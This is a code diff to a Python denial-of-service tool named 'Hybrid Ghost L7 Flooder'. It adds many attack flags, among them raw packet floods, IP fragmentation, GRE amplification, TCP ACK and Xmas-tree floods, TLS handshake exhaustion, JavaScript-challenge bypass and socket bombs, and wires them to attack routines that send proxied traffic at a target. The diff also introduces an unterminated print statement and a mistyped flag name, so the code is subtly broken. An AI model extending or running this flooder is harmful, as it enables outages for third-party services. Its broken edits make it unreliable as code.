@@ -8,7 +8,8 @@ import httpx
 import socket
 import json
 import base64
-import multiprocessing
+import hashlib
+import collections
 from rich import print
 from colorama import Fore, Style, init
 from tls_client import Session
@@ -431,6 +432,7 @@ async def waf_reaction_simulator(target, proxies, threads, use_tls=False):
                     async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                         status_code = post_response.status
                         latency = round((time.time() - start) * 1000)
+                        print(f"[green]Status: {status_code} |
                         print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                         if status_code < 400:
                             global proxy_success
@@ -822,7 +824,6 @@ async def bypass_javascript_challenge(target, proxies, threads, use_tls=False):
                 if not proxy:
                     continue  # skip iteration
                 headers = generate_headers(target)
-                headers['Cookie'] = base64.b64encode(uuid.uuid4().bytes).decode()
                 data = generate_payload()
                 try:
                     start = time.time()
@@ -938,7 +939,7 @@ def main():
     proxy_success = 0
     proxy_fail = 0
     total_requests = 0
-    status_codes = {}
+    status_codes = collections.Counter()
     average_rtt = 0
 
     parser = argparse.ArgumentParser(description="Hybrid Ghost L7 Flooder vFinal")
@@ -957,6 +958,20 @@ def main():
     parser.add_argument("--replay-mode", action="store_true", help="Replay logged successful payloads")
     parser.add_argument("--timed-chain", action="store_true", help="Enable Time-based Chainer")
     parser.add_argument("--l7l4-blend", action="store_true", help="Enable Extra Brutality: Partial L4 Blend")
+    parser.add_argument("--raw-packet-flood", action="store_true", help="Enable Raw Packet Flood (L3)")
+    parser.add_argument("--ip-fragmentation-exploit", action="store_true", help="Enable IP Fragmentation Exploit (L3)")
+    parser.add_argument("--icmp-fragment-flood", action="store_true", help="Enable ICMP Fragment Flood (L3)")
+    parser.add_argument("--gre-amplification", action="store_true", help="Enable GRE Amplification (L3)")
+    parser.add_argument("--tcp-ack-flood", action="store_true", help="Enable TCP ACK Flood (L4)")
+    parser.add_argument("--tcp-xmas-tree-flood", action="store_true", help="Enable TCP Xmas Tree Flood (L4)")
+    parser.add_argument("--udp-protocol-exhaustion", action="store_true", help="Enable UDP Protocol Exhaustion (L4)")
+    parser.add_argument("--tls-handshake-exhaustion", action="store_true", help="Enable TLS Handshake Exhaustion (L4)")
+    parser.add_argument("--dynamic-payload-mutation", action="store_true", help="Enable Dynamic Payload Mutation (L7)")
+    parser.add_argument("--header-overflow-exploit", action="store_true", help="Enable Header Overflow Exploit (L7)")
+    parser.add_argument("--cookie-logic-bombing", action="store_true", help="Enable Cookie Logic Bombing (L7)")
+    parser.add_argument("--bypass-javascript-challenge", action="store_true", help="Enable Bypass JavaScript Challenge (L7)")
+    parser.add_argument("--recursive-path-ref-exploit", action="store_true", help="Enable Recursive Path & Ref Exploit (L7)")
+    parser.add_argument("--intelligent-async-socket-bomb", action="store_true", help="Enable Intelligent Async Socket Bomb (L7)")
     args = parser.parse_args()
 
     target = args.target
@@ -989,7 +1004,7 @@ def main():
         tasks.append(tls_fingerprint_rotate(target, proxies, threads, use_tls))
     if args.proxy_auto_score:
         tasks.append(proxy_score_autobalancer(target, proxies, threads, use_tls))
-    if args.simulate_waf_react:
+    if args.simulate_waf_reac:
         tasks.append(waf_reaction_simulator(target, proxies, threads, use_tls))
     if args.log_success or args.replay_mode:
         tasks.append(attack_log_replay(target, proxies, threads, use_tls, args.replay_mode))
@@ -997,8 +1012,6 @@ def main():
         tasks.append(timed_chainer(target, proxies, threads, use_tls))
     if args.l7l4_blend:
         tasks.append(l7l4_blend(target, proxies, threads, use_tls))
-
-    # L3 (Network Layer) Attacks
     if args.raw_packet_flood:
         tasks.append(raw_packet_flood(target, threads))
     if args.ip_fragmentation_exploit:
@@ -1007,8 +1020,6 @@ def main():
         tasks.append(icmp_fragment_flood(target, threads))
     if args.gre_amplification:
         tasks.append(gre_amplification(target, threads))
-
-    # L4 (Transport Layer) Attacks
     if args.tcp_ack_flood:
         tasks.append(tcp_ack_flood(target, threads))
     if args.tcp_xmas_tree_flood:
@@ -1017,8 +1028,6 @@ def main():
         tasks.append(udp_protocol_exhaustion(target, threads))
     if args.tls_handshake_exhaustion:
         tasks.append(tls_handshake_exhaustion(target, threads))
-
-    # L7 (Application Layer) Attacks
     if args.dynamic_payload_mutation:
         tasks.append(dynamic_payload_mutation(target, proxies, threads, use_tls))
     if args.header_overflow_exploit:
